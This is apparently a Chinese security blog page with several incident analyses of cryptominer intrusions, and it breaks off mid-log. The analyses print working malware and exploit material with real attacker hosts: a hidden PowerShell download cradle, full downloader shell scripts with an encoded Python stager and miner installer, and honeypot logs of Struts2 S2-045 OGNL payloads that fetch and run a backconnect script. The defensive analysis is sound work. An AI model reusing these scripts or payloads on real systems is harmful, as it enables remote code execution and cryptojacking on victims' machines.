<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden <span class="string">'-encode'</span>, <span class="string">'iex (New-Object SystemNet.WebClient).DownloadString('</span>http://ait7ee.win/scv.ps1<span class="string">')'</span></div></pre></td></tr></table></figure>
<p>可以看到powershell执行的是下载操作,下载的文件地址是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ait7ee.win/scv.ps1</div></pre></td></tr></table></figure>
<p>把这个文件下载下来，发现是一个经过高度混淆加密的ps脚本，具体内容没有分析出来，猜测是用于安装挖矿程序及其服务的。</p>
<p>在脚本里找到这样一个地址：</p>
<p><img src="H:\gitBlog\themes\landscape\source\upload_image\745.png" alt="745"></p>
<p>直接访问   <a href="http://ait7ee.win/orbital_command.ps1" target="_blank" rel="external">http://ait7ee.win/orbital_command.ps1</a> 下载到一个新的脚本，简单分析之后发现是powersploit渗透框架下的一个模块<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="external">Invoke-ReflectivePEInjection.ps1</a>，功能是远程加载exe或dll并执行</p>
<p>链接：<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1" target="_blank" rel="external">https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1</a></p>
<p>但是其中最后部分又经过了加密.</p>
<p>下面还有一段命令：</p>
<p><img src="H:\gitBlog\themes\landscape\source\upload_image\15-3-43.png" alt="15-3-43"></p>
<p>从<strong>149.255.35.91</strong>上下载<strong>larva.sh</strong>文件并执行，之后删除这个文件</p>
<p><strong>larva.sh</strong> 内容如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line">psarg=<span class="string">""</span></div><div class="line"><span class="keyword">if</span> [[ -n `ps -lf` ]]; <span class="keyword">then</span></div><div class="line">psarg=<span class="string">"-lf"</span></div><div class="line"><span class="keyword">elif</span> [[ -n `ps -au` ]]; <span class="keyword">then</span></div><div class="line">psarg=<span class="string">"-au"</span></div><div class="line"><span class="keyword">fi</span></div><div class="line">mutex=<span class="string">"21914"</span></div><div class="line">mutex_exist=<span class="string">''</span></div><div class="line"><span class="keyword">if</span> [[ <span class="variable">$psarg</span> ]]; <span class="keyword">then</span></div><div class="line"><span class="keyword">if</span> [[ `ps <span class="variable">$psarg</span> | grep -v grep | grep -c <span class="variable">$mutex</span> ` -gt 0 ]]; <span class="keyword">then</span></div><div class="line">mutex_exist=1</div><div class="line"><span class="keyword">else</span></div><div class="line">mutex_exist=<span class="string">''</span></div><div class="line"><span class="keyword">fi</span></div><div class="line"><span class="keyword">fi</span></div><div class="line"><span class="keyword">if</span> [[ <span class="variable">$mutex_exist</span> -gt 0 ]]; <span class="keyword">then</span></div><div class="line"><span class="built_in">echo</span> mutex exist, quiting script</div><div class="line"><span class="built_in">exit</span></div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">echo</span> mutex not exist, starting a new one</div><div class="line">sleep 800.<span class="variable">$mutex</span> &amp;</div><div class="line"><span class="keyword">fi</span></div><div class="line">sh -c <span class="string">"(cat &lt; /dev/tcp/ait7ee.win/23546 &gt; /tmp/mule || wget http://ait7ee.win/mule -O /tmp/mule || curl -s http://ait7ee.win/mule -o /tmp/mule) &amp;&amp; chmod +x /tmp/mule &amp;&amp; (nohup /tmp/mule &amp;) &amp;&amp; sleep 1 &amp;&amp; rm -f /tmp/mule"</span> &amp;</div><div class="line">rm -f /tmp/larva.sh</div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">tcp_download</span></span>()</div><div class="line">&#123;</div><div class="line">FileServer=<span class="variable">$1</span></div><div class="line">Port=<span class="variable">$2</span></div><div class="line">Target=<span class="variable">$3</span></div><div class="line">cat &lt; /dev/tcp/<span class="variable">$FileServer</span>/<span class="variable">$Port</span> &gt; <span class="variable">$Target</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">http_download</span></span>()</div><div class="line">&#123;</div><div class="line">Url=<span class="variable">$1</span></div><div class="line">Target=<span class="variable">$2</span></div><div class="line">wget <span class="variable">$Url</span> -O <span class="variable">$Target</span> || curl -s <span class="variable">$Url</span> -o <span class="variable">$Target</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">download</span></span>()</div><div class="line">&#123;</div><div class="line">FileServer=<span class="variable">$1</span></div><div class="line">Port=<span class="variable">$2</span></div><div class="line">FileName=<span class="variable">$3</span></div><div class="line">Target=<span class="variable">$4</span></div><div class="line">tcp_download <span class="variable">$FileServer</span> <span class="variable">$Port</span> <span class="variable">$Target</span> || http_download http://<span class="variable">$FileServer</span>/<span class="variable">$FileName</span> <span class="variable">$Target</span></div><div class="line">&#125;</div><div class="line"><span class="keyword">function</span> <span class="function"><span class="title">download_and_execute</span></span>()</div><div class="line">&#123;</div><div class="line">FileServer=<span class="variable">$1</span></div><div class="line">Port=<span class="variable">$2</span></div><div class="line">FileName=<span class="variable">$3</span></div><div class="line">Target=<span class="variable">$4</span></div><div class="line">download <span class="variable">$FileServer</span> <span class="variable">$Port</span> <span class="variable">$FileName</span> <span class="variable">$Target</span></div><div class="line">chmod +x <span class="variable">$Target</span></div><div class="line">nohup <span class="variable">$Target</span> &amp;</div><div class="line">sleep 1</div><div class="line">rm -f <span class="variable">$Target</span></div><div class="line">&#125;</div><div class="line"><span class="built_in">echo</span> <span class="string">"from subprocess import *;p = Popen('python',stdin=PIPE); p.stdin.write(\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly80Ni4yMS4xNDcuMTMzOjgwMDEnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPW84MkZ5MU11QWE5M0lMVnYwZS9PQ29qb2M2ST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKydlfU9CdStqRENOP152bVZnOzoxLSFMeG4jR2M8PXs5Syc7UyxqLG91dD1yYW5nZSgyNTYpLDAsW10KZm9yIGkgaW4gcmFuZ2UoMjU2KToKICAgIGo9KGorU1tpXStvcmQoa2V5W2klbGVuKGtleSldKSklMjU2CiAgICBTW2ldLFNbal09U1tqXSxTW2ldCmk9aj0wCmZvciBjaGFyIGluIGRhdGE6CiAgICBpPShpKzEpJTI1NgogICAgaj0oaitTW2ldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KICAgIG91dC5hcHBlbmQoY2hyKG9yZChjaGFyKV5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSk='));\");"</span> | python</div><div class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></div><div class="line">sleep 3600.<span class="variable">$mutex</span> &amp;</div><div class="line">sleep 3600.<span class="variable">$mutex</span></div><div class="line">download_and_execute ait7ee.win 23547 mule /tmp/mule</div><div class="line">pkill stratum</div><div class="line"><span class="keyword">done</span></div></pre></td></tr></table></figure>
<p>主要功能还是从主机下载文件并执行</p>
<p>其中的域名和ip跟上面解码出来的是同一台主机</p>
<p>脚本里还有一段编码后的命令，它的明文如下:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">import sys;import re, subprocess;cmd = <span class="string">"ps -ef | grep Little\ Snitch | grep -v grep"</span></div><div class="line">ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)</div><div class="line">out = ps.stdout.read()</div><div class="line">ps.stdout.close()</div><div class="line"><span class="keyword">if</span> re.search(<span class="string">"Little Snitch"</span>, out):</div><div class="line">sys.exit()</div><div class="line">import urllib2;</div><div class="line">UA=<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'</span>;server=<span class="string">'http://46.21.147.133:8001'</span>;t=<span class="string">'/login/process.php'</span>;req=urllib2.Request(server+t);</div><div class="line">req.add_header(<span class="string">'User-Agent'</span>,UA);</div><div class="line">req.add_header(<span class="string">'Cookie'</span>,<span class="string">"session=o82Fy1MuAa93ILVv0e/OCojoc6I="</span>);</div><div class="line">proxy = urllib2.ProxyHandler();</div><div class="line">o = urllib2.build_opener(proxy);</div><div class="line">urllib2.install_opener(o);</div><div class="line">a=urllib2.urlopen(req).<span class="built_in">read</span>();</div><div class="line">IV=a[0:4];data=a[4:];key=IV+<span class="string">'e&#125;OBu+jDCN?^vmVg;:1-!Lxn#Gc&lt;=&#123;9K'</span>;S,j,out=range(256),0,[]</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(256):</div><div class="line">j=(j+S[i]+ord(key[i%len(key)]))%256</div><div class="line">S[i],S[j]=S[j],S[i]</div><div class="line">i=j=0</div><div class="line"><span class="keyword">for</span> char <span class="keyword">in</span> data:</div><div class="line">i=(i+1)%256</div><div class="line">j=(j+S[i])%256</div><div class="line">S[i],S[j]=S[j],S[i]</div><div class="line">out.append(chr(ord(char)^S[(S[i]+S[j])%256]))</div><div class="line"><span class="built_in">exec</span>(<span class="string">''</span>.join(out))</div></pre></td></tr></table></figure>
<p>其中<strong><a href="http://46.21.147.133:8001" target="_blank" rel="external">http://46.21.147.133:8001</a></strong>这个地址已经无法访问，所以不清楚process.php内容是什么</p>
<p>这次攻击涉及到的样本有 <strong>larva.sh</strong>，<strong>mule</strong>，<strong>scv.ps1</strong></p>
<p>其中<strong>mule</strong>样本和windows下的<strong>mule64.exe</strong>样本在virustotal上分析结果是门罗币挖矿程序</p>
<p><a href="https://www.virustotal.com/#/file/3a6a3b71e7287bb0cb4e351fb7c208799f54bd95fbc10358889e59119820df1f/details" target="_blank" rel="external">https://www.virustotal.com/#/file/3a6a3b71e7287bb0cb4e351fb7c208799f54bd95fbc10358889e59119820df1f/details</a></p>
<p><a href="https://www.virustotal.com/#/file/41fd1c757801ccbe924c74ac26539d4e187cc4e1b45f971ac16e1e059809471b/details" target="_blank" rel="external">https://www.virustotal.com/#/file/41fd1c757801ccbe924c74ac26539d4e187cc4e1b45f971ac16e1e059809471b/details</a></p>
<p><a href="https://www.hybrid-analysis.com/sample/3a6a3b71e7287bb0cb4e351fb7c208799f54bd95fbc10358889e59119820df1f" target="_blank" rel="external">https://www.hybrid-analysis.com/sample/3a6a3b71e7287bb0cb4e351fb7c208799f54bd95fbc10358889e59119820df1f</a>  (hybrid-analysis的分析)</p>
<p><strong>ait7ee.win</strong> 这个域名和下面命令中的<strong>149.255.35.91</strong>是同一个ip，virustotal上在10月18号有记录这个域名和相关文件，样本还没有上传</p>
<p><img src="H:\gitBlog\themes\landscape\source\upload_image\15-1-29.png" alt="15-1-29"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/01/10/powershell植入mule挖矿程序事件分析/" data-id="cjca1zrwj000g881bgu68fot0" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-利用s2-045植入门罗币挖矿程序事件分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/09/利用s2-045植入门罗币挖矿程序事件分析/" class="article-date">
  <time datetime="2018-01-09T12:57:55.000Z" itemprop="datePublished">2018-01-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/09/利用s2-045植入门罗币挖矿程序事件分析/">利用s2-045植入门罗币挖矿程序事件分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>最近发现RASP拦截到一条请求，进行了简单的分析：</p>
<p><img src="H:\gitBlog\themes\landscape\source\upload_image\10-39-41.png" alt="10-39-41"></p>
<p>日志部分是这样的：</p>
<p><img src="H:\gitBlog\themes\landscape\source\upload_image\10-41-5.png" alt="10-41-5"></p>
<p><strong>5.188.10.251</strong>(保加利亚) 这个ip在两天内对4台服务器都发起了20+20次的请求，其中前20次是探测s2-045漏洞是否存在，后20次是发起攻击（对不同url参数进行探测所以在短时间内连续发起20个请求）攻击指令是创建一个计划任务从 <strong>5.188.87.12</strong>(荷兰)<strong> </strong>这台主机上下载<strong>arrow.jpg</strong>文件并执行** arrow.jpg文件是一个bash脚本，内容如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/sh</span></div><div class="line">id1=<span class="string">"jbpnwjuxvc"</span></div><div class="line">id2=<span class="string">"jvdxbsjgds"</span></div><div class="line">id3=<span class="string">"xztd"</span></div><div class="line">rm -rf /var/tmp/grdd</div><div class="line">rm -rf /var/tmp/`<span class="built_in">echo</span> <span class="variable">$id1</span>`.conf</div><div class="line">ps auxf|grep -v grep|grep -v `<span class="built_in">echo</span> <span class="variable">$id2</span>`|grep <span class="string">"/tmp/"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"\-p x"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"stratum"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"cryptonight"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"wcubpiztlk"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"laqzdbgiuz"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep <span class="string">"sacpehnflw"</span>|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps auxf|grep -v grep|grep `<span class="built_in">echo</span> <span class="variable">$id1</span>`|awk <span class="string">'&#123;print $2&#125;'</span>|xargs <span class="built_in">kill</span> -9</div><div class="line">ps -fe|grep `<span class="built_in">echo</span> <span class="variable">$id2</span>`|grep -v grep</div><div class="line"><span class="keyword">if</span> [ $? -ne 0 ]</div><div class="line"><span class="keyword">then</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"start process....."</span></div><div class="line">chmod 777 /var/tmp/`<span class="built_in">echo</span> <span class="variable">$id2</span>`.conf</div><div class="line">rm -rf /var/tmp/`<span class="built_in">echo</span> <span class="variable">$id2</span>`.conf</div><div class="line">curl -o /var/tmp/`<span class="built_in">echo</span> <span class="variable">$id2</span>`.conf http://5.188.87.12/locales/acpid.conf</div><div class="line">wget -O /var/tmp/`<span class="built_in">echo</span> <span class="variable">$id2</span>`.conf http://5.188.87.12/locales/acpid.conf</div><div class="line">chmod 777 /var/tmp/acpid</div><div class="line">rm -rf /var/tmp/acpid</div><div class="line">cat /proc/cpuinfo|grep aes&gt;/dev/null</div><div class="line"><span class="keyword">if</span> [ $? -ne 1 ]</div><div class="line"><span class="keyword">then</span></div><div class="line">curl -o /var/tmp/acpid http://5.188.87.12/locales/acpid</div><div class="line">wget -O /var/tmp/acpid http://5.188.87.12/locales/acpid</div><div class="line"><span class="keyword">else</span></div><div class="line">curl -o /var/tmp/acpid http://5.188.87.12/locales/acpid_na</div><div class="line">wget -O /var/tmp/acpid http://5.188.87.12/locales/acpid_na</div><div class="line"><span class="keyword">fi</span></div><div class="line">chmod +x /var/tmp/acpid</div><div class="line"><span class="built_in">cd</span> /var/tmp</div><div class="line">proc=`grep -c ^processor /proc/cpuinfo`</div><div class="line">cores=$(((<span class="variable">$proc</span>+1)/2))</div><div class="line">nohup ./acpid -c `<span class="built_in">echo</span> <span class="variable">$id2</span>`.conf -t `<span class="built_in">echo</span> <span class="variable">$cores</span>` &gt;/dev/null &amp;</div><div class="line"><span class="keyword">else</span></div><div class="line"><span class="built_in">echo</span> <span class="string">"runing....."</span></div><div class="line"><span class="keyword">fi</span></div></pre></td></tr></table></figure>
<p>主要功能是从 <strong><a href="http://5.188.87.12" target="_blank" rel="external">http://5.188.87.12</a></strong> 下载一个配置文件 <strong>acpid.conf </strong>并重命名，并且下载了 <strong>acpid</strong> 和 <strong>acpid_na </strong>两个样本，</p>
<p>然后获取了受害主机的cpu核数，把配置文件内容和cpu核数作为参数执行 <strong>acpid</strong> 这个程序</p>
<p><strong>acpid.conf </strong>内容如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line"><span class="string">"url"</span> : <span class="string">"stratum+tcp://158.69.25.71:80"</span>,</div><div class="line"><span class="string">"user"</span> : <span class="string">"43We5FWNCmqffXY5tHriA3LMqhCRgXP9uZvMAZ8gfG7SYaLdQTpo2GGPDjk6zWdGAe6RedPTRhmC1EkGnAY3dPE62H3Gu8R"</span>,</div><div class="line"><span class="string">"pass"</span> : <span class="string">"x"</span>,</div><div class="line"><span class="string">"algo"</span> : <span class="string">"cryptonight"</span>,</div><div class="line"><span class="string">"quiet"</span> : <span class="literal">true</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>根据配置文件内容判断这应该是一个挖矿程序，访问其中了url地址发现返回的是一个 <strong>minexmr</strong> id</p>
<p>由此判断这属于<strong>门罗币</strong>的挖矿样本，查了一下这个钱包地址应该还在持续收益<img src="H:\gitBlog\themes\landscape\source\upload_image\10-58-43.png" alt="10-58-43"></p>
<p>脚本中出现的两个样本hash分别为</p>
<p>9359f7e7b1dd0f4ce4a2c52fe611c981a3dd7a17f935862e3ce9acb5f2df8ced</p>
<p>f4864b3793c93de50b953e9751dc22e03fa0333ae6856d8d153be9018da6d911</p>
<p>在virustotal上查询了这两个样本，第一次出现都是在10月30日，在24小时前还被重新上传分析，判断这个样本在近期又开始活跃了:</p>
<p><img src="H:\gitBlog\themes\landscape\source\upload_image\11-15-25.png" alt="11-15-25"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>通过几次的攻击行为来看利用已公开的漏洞植入恶意挖矿程序变得越来越流行，虚拟货币不断增值也更促进了这一产业链的不断扩大</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/01/09/利用s2-045植入门罗币挖矿程序事件分析/" data-id="cjca1zrwl000j881bxghwks3j" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-s2-045入侵事件分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/01/09/s2-045入侵事件分析/" class="article-date">
  <time datetime="2018-01-09T11:40:14.000Z" itemprop="datePublished">2018-01-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/01/09/s2-045入侵事件分析/">s2-045入侵事件分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>近期在蜜罐日志中发现一起针对s2-045的攻击，日志内容：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">201.79.64.0 - - [02/Sep/2017:01:38:01 +0000] <span class="string">"POST / HTTP/1.0"</span> [] 200 - [Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)] [%&#123;(<span class="comment">#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 0.056 199</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:01:42:35 +0000] <span class="string">"POST / HTTP/1.0"</span> [] 200 - [Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)] [%&#123;(<span class="comment">#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget ').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 0.084 282</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:01:42:45 +0000] <span class="string">"POST / HTTP/1.0"</span> [] 200 - [Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)] [%&#123;(<span class="comment">#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='wget ftp://88.105.16.7/Public/bc.pl').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 3.179 700</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:01:42:54 +0000] <span class="string">"POST / HTTP/1.0"</span> [] 200 - [Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)] [%&#123;(<span class="comment">#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='perl bc.pl').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 0.155 319</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:01:43:20 +0000] <span class="string">"POST / HTTP/1.0"</span> [] 200 - [Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; MAXTHON 2.0)] [%&#123;(<span class="comment">#fuck='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='perl bc.pl 201.33.21.109 333').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;] 0.300 370</span></div><div class="line">201.79.64.0 - - [02/Sep/2017:02:20:23 +0000] <span class="string">"POST / HTTP/1.0"</span> [] 200 - [Mozilla/4.0 (compatible; MSIE 